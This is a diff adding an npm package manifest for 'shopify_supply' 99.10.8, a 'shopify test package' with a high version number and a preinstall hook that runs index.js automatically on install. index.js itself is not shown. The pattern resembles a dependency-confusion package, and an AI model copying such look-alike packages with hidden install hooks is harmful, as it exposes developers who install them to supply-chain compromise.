@@ -1,0 +1,39 @@
+{
+    "name": "shopify_supply",
+    "version": "99.10.8",
+    "description": "shopify test package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "shopify_supply@99.10.8",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-pk8ir1/PjhDvkZHRM/BaxxIqZ6rCrmMfw8hNx/oFzSkeKbrAIWHVBk2GdQCfZSjuNkIYlOepQ7bPFJQRwbXX7w==",
+        "shasum": "804d913fdbbc056a514186c7aa8c09472442b003",
+        "tarball": "https://registry.npmjs.org/shopify_supply/-/shopify_supply-99.10.8.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3222,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhmnnoCRA9TVsSAnZWagAAbnMP/0V+deAX8+jP10Zj92xA\n8xfa3M/f4zGt0XqdjTFTiqe1xCDBem8qleC680m+ucLpta2B5BXzSszBh1BM\nEb+lsCOBaiqyy7apl3FSGgKmSSBpDKjlNSw51WduPnjWYiv/tBnKTNomzuov\nlldf0u2Ptv/E9tU1okYiCWuAmkv1Rqqz0hat73PWIfW7XpGcwVjAS3buxTmH\nWGxsz+3wd+akVIZ5OiiJWxQezA+eE6w1vGHVRHckppms+mgzkmE5kbyD+uLc\nz3U1JclISeQYjTmsSAQDRX9pn2Dnt8w6FE6VE8RTsEVsW8yC/+U021hxLHD/\nOTMmnWD+yy9++zPEAzDtTsLz/upIi+AUq9d3BeWU6OJyw3RYptzNNSYje8dQ\n+hhIDKKnyFcuIMB+aO5lIfMsWaOhvBflh6dLPIYjqkQLzvDP8GxSU9UpZlnz\nh8g5tycvTw/IqaT6FxI+ROzXYqXDWvb4ohtiSj6dwgeUDEknIDu36xHs3hlK\n6uApL0P0tLXr+9S0BDwq/0rowL4B2UcThisoID4mspPuObl5+6BVquyL1dKP\nReFLNgXanOoy644GrqRhUBmZ7GKncALOeFDv3EklUTjKD9MRGsAcubb3Q4gS\nHMnHTe/6Wkrkx7/6ratxQSni1/HhoLAoG8gaA6b757C/39qwZudMkwkd6AcV\nFdyx\r\n=9aCr\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "hussam22",
+        "email": "hussam.tes09@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "hussam22",
+            "email": "hussam.tes09@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/shopify_supply_99.10.8_1637513704431_0.11515021962018479"
+    },
+    "_hasShrinkwrap": false
+}
